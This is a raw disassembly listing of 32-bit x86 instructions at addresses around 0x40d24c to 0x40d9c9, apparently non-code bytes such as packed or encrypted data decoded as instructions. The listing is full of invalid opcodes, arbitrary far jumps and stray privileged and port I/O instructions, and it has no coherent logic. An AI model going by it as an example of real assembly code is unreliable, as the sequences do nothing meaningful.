  40d24c:	outs   dx,DWORD PTR ds:[esi]
  40d24d:	repz sub BYTE PTR [edx-0x5c],al
  40d251:	adc    DWORD PTR [eax-0x6e8d013c],edx
  40d257:	lds    edx,FWORD PTR [esi]
  40d259:	dec    ebx
  40d25a:	les    esi,FWORD PTR [eax]
  40d25c:	push   ds
  40d25d:	cli    
  40d25e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d25f:	jl     0x40d29d
  40d261:	hlt    
  40d262:	jae    0x40d208
  40d264:	pop    esp
  40d265:	and    BYTE PTR [eax-0x56ec2dbf],bh
  40d26b:	(bad)  
  40d26c:	popf   
  40d26d:	shl    BYTE PTR [ecx+ebp*4-0x44],cl
  40d271:	fild   QWORD PTR [edi*1+0x7ced7e4c]
  40d278:	mov    ebp,edi
  40d27a:	retf   
  40d27b:	or     DWORD PTR ss:[ebp+0x61252524],0x59c5806b
  40d286:	jg     0x40d2eb
  40d288:	popf   
  40d289:	xchg   edx,eax
  40d28a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d28c:	jo     0x40d29c
  40d28e:	jo     0x40d2ec
  40d290:	mov    edi,0xc3da1795
  40d295:	into   
  40d296:	aam    0xba
  40d298:	inc    esp
  40d299:	jo     0x40d2bd
  40d29b:	jb     0x40d236
  40d29d:	cmp    esi,eax
  40d29f:	mov    ebp,0xd4afc6b5
  40d2a4:	and    ebp,DWORD PTR [ebp+0x71]
  40d2a7:	push   cs
  40d2a8:	call   0xba26:0x95f493dd
  40d2af:	dec    ebx
  40d2b0:	in     eax,dx
  40d2b1:	aaa    
  40d2b2:	add    DWORD PTR [ebp-0x6629f339],edi
  40d2b8:	mov    ch,0x62
  40d2ba:	scas   al,BYTE PTR es:[edi]
  40d2bb:	and    DWORD PTR [ebx+0x1],edx
  40d2be:	ins    BYTE PTR es:[edi],dx
  40d2bf:	cmp    al,0x15
  40d2c1:	lea    ebp,[ebx]
  40d2c3:	push   0x1c0fff25
  40d2c8:	xlat   BYTE PTR ds:[ebx]
  40d2c9:	bound  esi,QWORD PTR [eax]
  40d2cb:	mov    edx,0x6efe07f
  40d2d0:	daa    
  40d2d1:	sub    BYTE PTR [esi-0x4adffbd9],0xa1
  40d2d8:	jnp    0x40d2b8
  40d2da:	mov    esp,0x662c84be
  40d2df:	mov    bl,BYTE PTR [esp+eax*8-0x5a]
  40d2e3:	(bad)  
  40d2e4:	dec    ecx
  40d2e5:	bound  ebp,QWORD PTR [esi-0x73]
  40d2e8:	mov    dh,0x87
  40d2ea:	xor    al,0x4a
  40d2ec:	jmp    0x40d30e
  40d2ee:	stc    
  40d2ef:	test   BYTE PTR [ecx-0x844b0af],0x51
  40d2f6:	jae    0x40d283
  40d2f8:	jecxz  0x40d292
  40d2fa:	cmp    eax,edi
  40d2fc:	or     eax,0x1ffa633a
  40d301:	mov    al,ds:0x8139bfa9
  40d306:	lock mov ds,esi
  40d309:	inc    ebx
  40d30a:	test   BYTE PTR [edi-0x43934acf],bh
  40d310:	mov    ds:0x1ff31dd7,eax
  40d315:	icebp  
  40d316:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d317:	(bad)  
  40d318:	out    0xb8,eax
  40d31a:	out    0x58,al
  40d31c:	pop    esp
  40d31d:	pop    eax
  40d31e:	jns    0x40d30e
  40d320:	mov    ds:0x37e88004,eax
  40d325:	add    DWORD PTR [eax-0x56],0x958aec8c
  40d32c:	repz shl DWORD PTR [esi+0x32],1
  40d330:	add    BYTE PTR [edx-0x4de19f21],ch
  40d336:	bound  ebp,QWORD PTR ds:0x6073168
  40d33c:	loopne 0x40d329
  40d33e:	cmp    bl,dh
  40d340:	push   ds
  40d341:	or     BYTE PTR [edx+0x69],ch
  40d344:	push   edi
  40d345:	repnz push cs
  40d347:	push   es
  40d348:	inc    edx
  40d349:	les    ebx,FWORD PTR [edi]
  40d34b:	push   ebx
  40d34c:	push   ebx
  40d34d:	cmp    eax,0x6146bc58
  40d352:	out    dx,eax
  40d353:	outs   dx,DWORD PTR ds:[esi]
  40d354:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d355:	outs   dx,BYTE PTR ds:[esi]
  40d356:	sub    ah,BYTE PTR [esi]
  40d358:	test   edi,ecx
  40d35a:	(bad)  
  40d35b:	imul   edi,ebp,0xffffff94
  40d35e:	ins    BYTE PTR es:[edi],dx
  40d35f:	or     BYTE PTR [esi],cl
  40d361:	dec    ecx
  40d362:	jbe    0x40d2fe
  40d364:	popa   
  40d365:	sar    BYTE PTR [ecx],1
  40d367:	push   ebp
  40d368:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d369:	int    0x16
  40d36b:	repnz loop 0x40d33f
  40d36e:	and    dl,ch
  40d370:	inc    ecx
  40d371:	outs   dx,BYTE PTR ds:[esi]
  40d372:	mov    es,WORD PTR [edi-0x4122e9c4]
  40d378:	outs   dx,BYTE PTR ds:[esi]
  40d379:	test   al,0x1f
  40d37b:	ror    BYTE PTR [ebp-0x48],1
  40d37e:	fild   DWORD PTR [esi+ebx*8]
  40d381:	stos   BYTE PTR es:[edi],al
  40d382:	cli    
  40d383:	jmp    0xda61:0x5ce03126
  40d38a:	jbe    0x40d40a
  40d38c:	or     bl,BYTE PTR [edi+0x5c]
  40d38f:	xor    BYTE PTR [bx],ah
  40d392:	dec    edi
  40d393:	loopne 0x40d376
  40d395:	inc    BYTE PTR [ebx-0x103ecde7]
  40d39b:	int    0xdf
  40d39d:	lock add bl,BYTE PTR ds:0x9162d74c
  40d3a4:	fistp  WORD PTR [ecx-0x2]
  40d3a7:	jl     0x40d334
  40d3a9:	ds add edi,0xffffffe9
  40d3ad:	imul   DWORD PTR ds:0x1f1ba115
  40d3b3:	adc    eax,ecx
  40d3b5:	popf   
  40d3b6:	clc    
  40d3b7:	mov    cl,0xca
  40d3b9:	(bad)  
  40d3bb:	sbb    DWORD PTR [edx],ebx
  40d3bd:	das    
  40d3be:	out    0xae,eax
  40d3c0:	imul   esp,ebp,0x3e
  40d3c3:	pop    esp
  40d3c4:	sbb    al,0xea
  40d3c6:	pop    ebx
  40d3c7:	test   al,0x98
  40d3c9:	sbb    al,BYTE PTR [edi+0x7d]
  40d3cc:	arpl   WORD PTR [ecx+0x6f93772c],di
  40d3d2:	das    
  40d3d3:	aam    0xb8
  40d3d5:	sti    
  40d3d6:	jl     0x40d37a
  40d3d8:	test   DWORD PTR [ecx-0x68],0x26bf3e63
  40d3df:	and    al,0x87
  40d3e1:	retf   
  40d3e2:	out    0xcc,al
  40d3e4:	outs   dx,DWORD PTR ds:[esi]
  40d3e5:	xlat   BYTE PTR ds:[ebx]
  40d3e6:	cdq    
  40d3e7:	push   eax
  40d3e8:	scas   eax,DWORD PTR es:[edi]
  40d3e9:	ds add al,0xb
  40d3ec:	mov    edi,0x45dc15dc
  40d3f1:	fcmovne st,st(5)
  40d3f3:	mov    edi,cs
  40d3f5:	jae    0x40d3aa
  40d3f7:	sbb    al,0xe1
  40d3f9:	lods   eax,DWORD PTR ds:[esi]
  40d3fa:	add    al,0xf0
  40d3fc:	outs   dx,BYTE PTR ds:[esi]
  40d3fd:	push   eax
  40d3fe:	jmp    0x40d42b
  40d400:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d401:	in     eax,0xcc
  40d403:	nop
  40d404:	(bad)  
  40d405:	and    edx,DWORD PTR [ecx]
  40d407:	aad    0x9f
  40d409:	lods   al,BYTE PTR ds:[esi]
  40d40a:	mov    al,ds:0x72bc1e4b
  40d40f:	test   eax,0x3d8ea0f
  40d414:	bound  ebp,QWORD PTR [ecx+ebp*4+0x6ba876c2]
  40d41b:	out    0x4,al
  40d41d:	or     ah,dh
  40d41f:	mov    ss,WORD PTR [ebx+edi*1+0x2d9d3da1]
  40d426:	mov    edx,ebx
  40d428:	push   edx
  40d429:	push   es
  40d42a:	mov    bh,0x76
  40d42c:	stos   BYTE PTR es:[edi],al
  40d42d:	mov    edi,ebp
  40d42f:	(bad)  [eax-0x14939ef1]
  40d435:	jo     0x40d48a
  40d437:	jno    0x40d441
  40d439:	or     edx,0x39
  40d43c:	das    
  40d43d:	push   ss
  40d43e:	xor    DWORD PTR [esi-0x17],edi
  40d441:	and    dl,BYTE PTR [esi-0x17]
  40d444:	fadd   DWORD PTR [esi+ecx*8+0x1d58fdf3]
  40d44b:	jmp    0xaf34:0x768d1694
  40d452:	bound  ebx,QWORD PTR [eax]
  40d454:	fild   WORD PTR [esi]
  40d456:	int    0xf5
  40d458:	xor    eax,0xb2002c77
  40d45d:	mul    dl
  40d45f:	mov    esi,0xc3baa5d8
  40d464:	xchg   esi,eax
  40d465:	daa    
  40d466:	daa    
  40d467:	pop    edi
  40d468:	call   0x2df5fb97
  40d46d:	sub    DWORD PTR [eax-0x2c95c8],0xffffffeb
  40d474:	das    
  40d475:	call   0x5276b4a8
  40d47a:	cli    
  40d47b:	fisttp DWORD PTR ss:[esi]
  40d47e:	es popf 
  40d480:	in     al,dx
  40d481:	outs   dx,BYTE PTR ds:[esi]
  40d482:	call   eax
  40d484:	pop    ebp
  40d485:	cmp    ah,BYTE PTR [esi]
  40d487:	dec    ecx
  40d488:	mov    al,0x3c
  40d48a:	mov    edi,0xc7db0d08
  40d48f:	sub    BYTE PTR [esi+0x2d],dl
  40d492:	mov    dh,0x17
  40d494:	cmp    edx,DWORD PTR [ebp-0x4ebd4bd6]
  40d49a:	ret    
  40d49b:	sti    
  40d49c:	les    edx,FWORD PTR [edi+ebp*1]
  40d49f:	(bad)  
  40d4a0:	mov    cl,0x4c
  40d4a2:	sar    DWORD PTR [edi+0x25d83ab0],1
  40d4a8:	adc    ch,BYTE PTR [edx+0x16]
  40d4ab:	jb     0x40d4da
  40d4ad:	mov    dl,0x25
  40d4af:	repz cmp eax,0x4f3d53b8
  40d4b5:	clc    
  40d4b6:	adc    DWORD PTR [edx],ecx
  40d4b8:	fs sub eax,0x84c77c18
  40d4be:	xchg   ebx,eax
  40d4bf:	stc    
  40d4c0:	(bad)  
  40d4c2:	out    dx,eax
  40d4c3:	pusha  
  40d4c4:	and    bh,bh
  40d4c6:	adc    ebp,DWORD PTR [eax+eax*8-0x1d]
  40d4ca:	mov    ebx,0xbf40db23
  40d4cf:	sub    al,0x9
  40d4d1:	rcr    BYTE PTR [edi],cl
  40d4d3:	call   0x30df:0xe499c27b
  40d4da:	and    esp,DWORD PTR [edi]
  40d4dc:	fidiv  WORD PTR [ecx-0x58]
  40d4df:	sub    edi,0x190b2373
  40d4e5:	out    dx,al
  40d4e6:	push   ecx
  40d4e7:	lock lahf 
  40d4e9:	int3   
  40d4ea:	mov    esi,0x37cea2a2
  40d4ef:	or     BYTE PTR [ecx-0x46df1c7],bl
  40d4f5:	jmp    0x7ab7:0xe5d53269
  40d4fc:	adc    al,0x88
  40d4fe:	cmp    eax,0x706f4a52
  40d503:	aas    
  40d504:	cmp    DWORD PTR [ebp+0x3c1dfa69],ecx
  40d50a:	imul   esp,ecx,0x40
  40d50d:	imul   ebx,DWORD PTR [esi],0xb3bdf455
  40d513:	scas   al,BYTE PTR es:[edi]
  40d514:	jg     0x40d541
  40d516:	bound  edx,QWORD PTR [edx+ebx*8]
  40d519:	xor    eax,0xed49cbc0
  40d51e:	jge    0x40d584
  40d520:	out    0x80,al
  40d522:	lock enter 0xdba5,0x88
  40d527:	jge    0x40d595
  40d529:	stos   DWORD PTR es:[edi],eax
  40d52a:	test   eax,0xdb084f3b
  40d52f:	mov    bh,0x29
  40d531:	scas   eax,DWORD PTR es:[edi]
  40d532:	aad    0xec
  40d534:	jge    0x40d571
  40d536:	xor    BYTE PTR [edx],bl
  40d538:	add    BYTE PTR [eax-0x78],0xef
  40d53c:	push   0x9941ace3
  40d541:	test   dl,dl
  40d543:	cs aam 0xec
  40d546:	cmp    eax,0xc94f5924
  40d54b:	add    al,0x39
  40d54d:	or     eax,0xc73ec6b
  40d552:	xchg   edx,eax
  40d553:	dec    eax
  40d554:	push   es
  40d555:	mov    al,0x81
  40d557:	fwait
  40d558:	adc    al,0x11
  40d55a:	pop    eax
  40d55b:	sub    al,0x18
  40d55d:	mov    DWORD PTR [edx],ecx
  40d55f:	push   edx
  40d560:	xchg   edx,eax
  40d561:	sti    
  40d562:	loope  0x40d550
  40d564:	ret    0x6b4c
  40d567:	cmp    al,0xb1
  40d569:	or     ch,ch
  40d56b:	aaa    
  40d56c:	inc    esi
  40d56d:	popa   
  40d56e:	jmp    0xb22d:0x5cba9094
  40d575:	and    eax,0x2228ffb2
  40d57a:	and    BYTE PTR [ebx-0x23],al
  40d57d:	cmp    ecx,edx
  40d57f:	(bad)  
  40d580:	in     al,0x9c
  40d582:	dec    edi
  40d583:	adc    eax,0x5850947a
  40d588:	lock xchg ebx,eax
  40d58a:	jp     0x40d5d4
  40d58c:	and    edx,DWORD PTR [ebx]
  40d58e:	addr16 mov edx,0x4044694e
  40d594:	mov    esi,0x95df596
  40d599:	mov    eax,ds:0xaf8ecaff
  40d59e:	leave  
  40d59f:	add    al,0xd3
  40d5a1:	into   
  40d5a2:	retf   
  40d5a3:	rol    BYTE PTR [edi-0x1d486797],0x0
  40d5aa:	shl    BYTE PTR [ebp-0x29ffa35c],cl
  40d5b0:	iret   
  40d5b1:	in     al,dx
  40d5b2:	pop    DWORD PTR [edx-0xaf5d984]
  40d5b8:	or     DWORD PTR [edx-0x678ab68d],0xfa862252
  40d5c2:	jb     0x40d59f
  40d5c4:	in     eax,dx
  40d5c5:	test   BYTE PTR [eax-0x5b],al
  40d5c8:	inc    edi
  40d5c9:	or     cl,bl
  40d5cb:	add    al,0xc3
  40d5cd:	cli    
  40d5ce:	into   
  40d5cf:	mov    ebx,0x145fed7
  40d5d4:	push   eax
  40d5d5:	in     al,0xc9
  40d5d7:	bound  esi,QWORD PTR [edi]
  40d5d9:	bound  edx,QWORD PTR [ebx]
  40d5db:	sub    DWORD PTR [eax+edx*2-0x46],ecx
  40d5df:	in     eax,dx
  40d5e0:	mov    ch,0xa3
  40d5e2:	inc    ebp
  40d5e3:	cmc    
  40d5e4:	inc    ebp
  40d5e5:	les    ebx,FWORD PTR [edi-0x68]
  40d5e8:	rcr    BYTE PTR [eax-0x57],1
  40d5eb:	push   edi
  40d5ec:	out    dx,eax
  40d5ed:	fstp   TBYTE PTR [edi+esi*1-0x4a]
  40d5f1:	pop    ss
  40d5f2:	test   BYTE PTR [eax+0x3a],dh
  40d5f5:	dec    eax
  40d5f6:	add    BYTE PTR [ebx+0x2b],bh
  40d5f9:	sub    DWORD PTR [ecx-0x36],esp
  40d5fc:	xor    dl,0x45
  40d5ff:	fidiv  WORD PTR [ebp+edx*2+0x5e]
  40d603:	lods   al,BYTE PTR ds:[esi]
  40d604:	add    al,0x58
  40d606:	jo     0x40d642
  40d608:	push   edx
  40d609:	xchg   ebp,eax
  40d60a:	xor    DWORD PTR [ecx],0x22
  40d60d:	fucomip st,st(2)
  40d60f:	push   ecx
  40d610:	das    
  40d611:	mov    al,ds:0x49eb26da
  40d616:	scas   al,BYTE PTR es:[edi]
  40d617:	pop    edi
  40d618:	test   eax,0x2b0ea691
  40d61d:	adc    ch,al
  40d61f:	(bad)  
  40d621:	aas    
  40d622:	outs   dx,BYTE PTR ds:[esi]
  40d623:	fisubr DWORD PTR ds:0x6406837e
  40d629:	xchg   ecx,eax
  40d62a:	rcl    BYTE PTR [esp+eiz*4+0x1f3f583e],0x4e
  40d632:	ds pop ebp
  40d634:	cmp    ch,dh
  40d636:	into   
  40d637:	inc    esp
  40d638:	sbb    bl,bl
  40d63a:	xlat   BYTE PTR ds:[ebx]
  40d63b:	in     eax,dx
  40d63c:	mov    ebp,0x2d5e5e8a
  40d641:	push   edx
  40d642:	mov    ds:0x64ab5b88,al
  40d647:	jae    0x40d5ce
  40d649:	das    
  40d64a:	inc    ebx
  40d64b:	loop   0x40d5d8
  40d64d:	push   eax
  40d64e:	push   edx
  40d64f:	lahf   
  40d650:	sub    BYTE PTR [edx-0x70],al
  40d653:	daa    
  40d654:	push   0xffffff8c
  40d656:	add    al,0x1
  40d658:	in     al,dx
  40d659:	sub    eax,0x3da413e0
  40d65e:	mov    cl,0x83
  40d660:	and    esp,DWORD PTR [ebp-0x6938b09e]
  40d666:	repnz adc DWORD PTR [edi+0x21],esp
  40d66a:	in     al,0xec
  40d66c:	idiv   DWORD PTR [ebx+edi*1-0x38cabe10]
  40d673:	fistp  QWORD PTR [ecx-0x2f]
  40d676:	cmp    BYTE PTR [esi],bl
  40d678:	(bad)  
  40d679:	inc    ecx
  40d67a:	mov    esi,0xe900e8d
  40d67f:	cmp    bl,bl
  40d681:	push   eax
  40d682:	fimul  WORD PTR [ecx]
  40d684:	int3   
  40d685:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d686:	cs hlt 
  40d688:	inc    ebp
  40d689:	mov    ch,0xc3
  40d68b:	das    
  40d68c:	jg     0x40d617
  40d68e:	sub    ch,dl
  40d690:	or     DWORD PTR [edx+edx*8],esi
  40d693:	mov    cl,0xc
  40d695:	aad    0x6c
  40d697:	shl    ah,cl
  40d699:	into   
  40d69a:	dec    edi
  40d69b:	jg     0x40d718
  40d69d:	sbb    BYTE PTR [ebp-0x3b72ed9c],ch
  40d6a3:	leave  
  40d6a4:	dec    edx
  40d6a5:	pop    eax
  40d6a6:	mov    DWORD PTR [edx],ebx
  40d6a8:	jle    0x40d6c0
  40d6aa:	aas    
  40d6ab:	repnz pop ecx
  40d6ad:	je     0x40d64d
  40d6af:	push   0x51591342
  40d6b4:	jne    0x40d6c7
  40d6b6:	arpl   WORD PTR [esi+0x799e29e0],bx
  40d6bc:	stos   BYTE PTR es:[edi],al
  40d6bd:	scas   al,BYTE PTR es:[edi]
  40d6be:	pop    ss
  40d6bf:	xchg   edi,eax
  40d6c0:	fidivr WORD PTR [esi]
  40d6c2:	fcom   st(4)
  40d6c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6c5:	and    DWORD PTR [edx+0x477de989],ebx
  40d6cb:	int3   
  40d6cc:	rol    BYTE PTR ds:0xbdb87cc4,0x35
  40d6d3:	rol    DWORD PTR [esi+eiz*8-0x76],0xc6
  40d6d8:	nop
  40d6d9:	cs (bad) 
  40d6db:	call   0x4e0c:0xa2e5ec55
  40d6e2:	scas   eax,DWORD PTR es:[edi]
  40d6e3:	push   esp
  40d6e4:	dec    esp
  40d6e5:	xchg   esp,eax
  40d6e6:	push   cs
  40d6e7:	cmp    eax,0xf9ccd258
  40d6ec:	dec    ecx
  40d6ed:	cwde   
  40d6ee:	retf   
  40d6ef:	or     ax,0xcdf1
  40d6f3:	sub    ah,BYTE PTR [ebx]
  40d6f5:	pop    edi
  40d6f6:	add    BYTE PTR [ebp-0x47],0x62
  40d6fa:	and    ch,BYTE PTR [ecx-0x4e736b9]
  40d700:	repnz les edx,FWORD PTR [eax]
  40d703:	shl    DWORD PTR [ebx],0x40
  40d706:	sbb    ebp,DWORD PTR [ebx+0x23fd41cf]
  40d70c:	push   cs
  40d70d:	stc    
  40d70e:	aad    0x53
  40d710:	sub    BYTE PTR ds:0xc67ed0ad,dl
  40d716:	call   0x9bd3:0xda787516
  40d71d:	ss mov edi,0x59ce29fe
  40d723:	mov    ds:0xe0a0a2d,eax
  40d728:	ret    0x8bdd
  40d72b:	push   ebp
  40d72c:	ret    0xac49
  40d72f:	mov    al,ds:0x53f12d86
  40d734:	in     eax,0x48
  40d736:	test   BYTE PTR [edi+0x15],0xde
  40d73a:	fucom  st(4)
  40d73c:	fcomip st,st(5)
  40d73e:	dec    ecx
  40d73f:	aas    
  40d740:	mov    ah,0x8a
  40d742:	dec    esp
  40d743:	imul   ebx,DWORD PTR [esi],0x7c
  40d746:	lds    ebp,FWORD PTR [edx+0x1a163808]
  40d74c:	xchg   ebx,eax
  40d74d:	imul   ecx,DWORD PTR [ecx+0x3f],0xffffffe2
  40d751:	scas   eax,DWORD PTR es:[edi]
  40d752:	xchg   ebx,eax
  40d753:	fs mov esp,0x21492ccb
  40d759:	push   edi
  40d75a:	adc    DWORD PTR [eax-0x469826d3],0xc27d4ab1
  40d764:	add    al,0xb9
  40d766:	shl    ah,0x8
  40d769:	gs jnp 0x40d7aa
  40d76c:	jo     0x40d7d8
  40d76e:	dec    ecx
  40d76f:	daa    
  40d770:	or     eax,ebx
  40d772:	push   cs
  40d773:	(bad)  
  40d774:	out    0x67,eax
  40d776:	call   0x1c5d312c
  40d77b:	cmp    DWORD PTR [edx-0x79eabffb],0xffffffa2
  40d782:	xchg   edx,eax
  40d783:	mov    ebp,0xd73d50c2
  40d788:	fist   DWORD PTR [esp+edx*1-0x78]
  40d78c:	shl    BYTE PTR [esi],0xcc
  40d78f:	sub    al,0x2d
  40d791:	cmp    ebp,ebx
  40d793:	add    ah,dh
  40d795:	mov    ah,0x4d
  40d797:	das    
  40d798:	rcr    DWORD PTR [eax+0x25727326],1
  40d79e:	pop    ebx
  40d79f:	(bad)  
  40d7a0:	std    
  40d7a1:	inc    ebx
  40d7a2:	dec    eax
  40d7a3:	std    
  40d7a4:	pop    ebx
  40d7a5:	scas   eax,DWORD PTR es:[edi]
  40d7a6:	push   esp
  40d7a7:	out    0x98,al
  40d7a9:	std    
  40d7aa:	or     DWORD PTR [ebp+0x24],esi
  40d7ad:	mov    ah,0xf3
  40d7af:	and    bl,BYTE PTR [ebp+0x13]
  40d7b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7b3:	xor    esp,edx
  40d7b5:	xchg   edi,eax
  40d7b6:	mov    bh,0xe5
  40d7b8:	fild   WORD PTR [edx-0x50b13e86]
  40d7be:	loopne 0x40d82b
  40d7c0:	stc    
  40d7c1:	or     al,0x92
  40d7c3:	mov    ds:0x522e52ff,eax
  40d7c8:	xchg   esp,eax
  40d7c9:	or     DWORD PTR [ecx-0x63],0x90cc5f19
  40d7d0:	dec    ebp
  40d7d1:	sar    BYTE PTR [eax-0x26],0xcd
  40d7d5:	out    dx,eax
  40d7d6:	mov    dl,0x49
  40d7d8:	daa    
  40d7d9:	aad    0xbb
  40d7db:	enter  0x40b8,0x60
  40d7df:	dec    eax
  40d7e0:	int    0x70
  40d7e2:	loop   0x40d7e3
  40d7e4:	or     al,0x9a
  40d7e6:	xor    edi,ebx
  40d7e8:	aam    0x78
  40d7ea:	pusha  
  40d7eb:	adc    eax,DWORD PTR [ebx+edi*8+0x51e234f9]
  40d7f2:	not    DWORD PTR [ebp+0x49]
  40d7f5:	fild   WORD PTR [ebp+0x2b]
  40d7f8:	popf   
  40d7f9:	call   0xfbdea2a9
  40d7fe:	lahf   
  40d7ff:	sti    
  40d800:	and    esi,DWORD PTR ds:0x7c786376
  40d806:	pop    ss
  40d807:	in     eax,0xc6
  40d809:	add    eax,eax
  40d80b:	ds out dx,al
  40d80d:	enter  0x2975,0xf1
  40d811:	mov    al,0x9d
  40d813:	repz mov esi,0x592b4f95
  40d819:	mov    DWORD PTR [edi],ecx
  40d81b:	sbb    BYTE PTR [ecx+esi*2-0x37d95c87],ch
  40d822:	xlat   BYTE PTR ds:[ebx]
  40d823:	sbb    DWORD PTR [eax],edx
  40d825:	dec    ecx
  40d826:	dec    edi
  40d827:	pop    ebp
  40d828:	clc    
  40d829:	lods   al,BYTE PTR ds:[esi]
  40d82a:	jo     0x40d7d6
  40d82c:	fwait
  40d82d:	inc    edi
  40d82e:	jb     0x40d839
  40d830:	dec    ebp
  40d831:	daa    
  40d832:	push   ecx
  40d833:	sub    BYTE PTR [esi-0x20],al
  40d836:	rcl    BYTE PTR ds:0xc917e323,1
  40d83c:	fcmovnu st,st(7)
  40d83e:	mov    esp,0x6e37c99d
  40d843:	xchg   edi,eax
  40d844:	(bad)  
  40d845:	sub    eax,DWORD PTR [eax+0x3a62f4f7]
  40d84b:	shl    DWORD PTR [ebx-0x4bf6d5cd],cl
  40d851:	je     0x40d827
  40d853:	xchg   ebx,eax
  40d854:	mov    edi,DWORD PTR [ebx-0x2d501288]
  40d85a:	mov    esp,0x2c89b434
  40d85f:	jns    0x40d8b9
  40d861:	xor    dh,ah
  40d863:	push   0xffffffd5
  40d865:	push   es
  40d866:	retf   
  40d867:	lock call 0x2759a19d
  40d86d:	add    al,0xbb
  40d86f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d870:	cdq    
  40d871:	mov    DWORD PTR [ecx-0x42a4e36e],edi
  40d877:	and    bl,BYTE PTR [ebp+eiz*8-0x12def127]
  40d87e:	mov    esp,0xe0668ee5
  40d883:	shr    BYTE PTR [edi+0x26146e4e],cl
  40d889:	ss jbe 0x40d8f2
  40d88c:	jns    0x40d8c4
  40d88e:	mov    cl,0x87
  40d890:	(bad)  
  40d894:	stc    
  40d895:	into   
  40d896:	cmc    
  40d897:	or     ch,BYTE PTR [eax-0x79f633b3]
  40d89d:	iret   
  40d89e:	sti    
  40d89f:	rcr    BYTE PTR [esi],cl
  40d8a1:	fist   DWORD PTR [ebx-0x7be85e65]
  40d8a7:	push   edi
  40d8a8:	xor    eax,DWORD PTR [edx+edi*4-0x48]
  40d8ac:	(bad)  
  40d8ad:	shr    DWORD PTR [ecx+0x78e09269],1
  40d8b3:	pop    es
  40d8b4:	ret    
  40d8b5:	popa   
  40d8b6:	jp     0x40d8de
  40d8b8:	lock cdq 
  40d8ba:	scas   eax,DWORD PTR es:[edi]
  40d8bb:	cdq    
  40d8bc:	out    0xcf,eax
  40d8be:	ins    DWORD PTR es:[edi],dx
  40d8bf:	jmp    0x40d888
  40d8c1:	cmp    BYTE PTR [edx],0xc9
  40d8c4:	mov    ds:0x4d9b3e2f,eax
  40d8c9:	push   ecx
  40d8ca:	add    dl,BYTE PTR [edi+0x21]
  40d8cd:	nop
  40d8ce:	push   0x265ef2b3
  40d8d3:	popf   
  40d8d4:	(bad)  
  40d8d5:	das    
  40d8d6:	sub    ecx,DWORD PTR [ebx-0x26]
  40d8d9:	retf   0xea15
  40d8dc:	repnz int3 
  40d8de:	lea    esi,[edx]
  40d8e0:	pop    esp
  40d8e1:	daa    
  40d8e2:	mov    esi,0x52acfb35
  40d8e7:	ss mov ecx,0xeafe746e
  40d8ed:	jns    0x40d923
  40d8ef:	repnz ss push ds
  40d8f2:	xchg   esi,eax
  40d8f3:	arpl   WORD PTR [ebp+0x3a],bp
  40d8f6:	mov    bh,0x8d
  40d8f8:	int    0xb8
  40d8fa:	xor    eax,0x11918f7b
  40d8ff:	mov    cl,0x27
  40d901:	sbb    eax,0x636bff1a
  40d906:	adc    DWORD PTR [ecx+eax*8],esi
  40d909:	adc    edi,eax
  40d90b:	pop    edi
  40d90c:	adc    DWORD PTR [eax+0x31d79353],edx
  40d912:	test   BYTE PTR [ecx],0x4
  40d915:	jb     0x40d90f
  40d917:	jl     0x40d947
  40d919:	in     al,0x4b
  40d91b:	jg     0x40d992
  40d91d:	jo     0x40d950
  40d91f:	je     0x40d947
  40d921:	inc    eax
  40d922:	xchg   esi,eax
  40d923:	js     0x40d907
  40d925:	xchg   esi,eax
  40d926:	and    al,0x8f
  40d928:	adc    al,0x49
  40d92a:	lods   eax,DWORD PTR ds:[esi]
  40d92b:	shr    dl,1
  40d92d:	sub    dl,BYTE PTR [ebx+0x74]
  40d930:	aaa    
  40d931:	push   ds
  40d932:	inc    edi
  40d933:	or     DWORD PTR [ebp-0x2c5509eb],edx
  40d939:	mov    edi,0xea3f70b
  40d93e:	in     eax,dx
  40d93f:	int    0x2d
  40d941:	test   DWORD PTR [esi],esp
  40d943:	fsubp  st(3),st
  40d945:	sub    eax,0x6b3ae7ff
  40d94a:	push   eax
  40d94b:	dec    edi
  40d94c:	mov    cl,dl
  40d94e:	sub    eax,0x1ecd7fdb
  40d953:	push   ecx
  40d954:	cmp    al,0x4c
  40d956:	sub    dl,bl
  40d958:	aaa    
  40d959:	stos   DWORD PTR es:[edi],eax
  40d95a:	rol    BYTE PTR ds:0x94b4ec9b,cl
  40d960:	xchg   ebp,eax
  40d961:	ret    
  40d962:	sbb    al,0xf4
  40d964:	or     al,0xff
  40d966:	leave  
  40d967:	retf   0x7fd0
  40d96a:	loope  0x40d9ea
  40d96c:	daa    
  40d96d:	es in  eax,0xf1
  40d970:	add    dh,bl
  40d972:	cli    
  40d973:	aaa    
  40d974:	jge    0x40d922
  40d976:	xchg   ebp,edx
  40d978:	lock xor eax,0x550051fe
  40d97e:	outs   dx,BYTE PTR ds:[esi]
  40d97f:	jle    0x40d997
  40d981:	and    DWORD PTR [ecx],edx
  40d983:	into   
  40d984:	mov    ch,0xc3
  40d986:	sub    DWORD PTR [ecx-0xf],edi
  40d989:	sbb    eax,0x9e4affda
  40d98e:	xchg   esi,eax
  40d98f:	aam    0x9c
  40d991:	jne    0x40d9d8
  40d993:	jp     0x40d9d1
  40d995:	or     DWORD PTR [eax],ebp
  40d997:	mov    ss,WORD PTR [edi-0x1965cd4e]
  40d99d:	pusha  
  40d99e:	call   0x439:0x2a8decae
  40d9a5:	add    ah,dh
  40d9a7:	xchg   edi,eax
  40d9a8:	es iret 
  40d9aa:	not    BYTE PTR [edi+0x1c4857b4]
  40d9b0:	xchg   esi,eax
  40d9b1:	imul   ecx,DWORD PTR [edi-0x2e],0xffffff84
  40d9b5:	fisubr DWORD PTR [edx+0x2f]
  40d9b8:	stc    
  40d9b9:	adc    eax,DWORD PTR [edx]
  40d9bb:	inc    ecx
  40d9bc:	cs data16 cmc 
  40d9bf:	pop    edi
  40d9c0:	jp     0x40da11
  40d9c2:	loopne 0x40d9b7
  40d9c4:	sti    
  40d9c5:	pop    ss
  40d9c6:	inc    eax
  40d9c7:	out    0xab,eax
  40d9c9:	add    BYTE PTR [ebp+0x8],bh
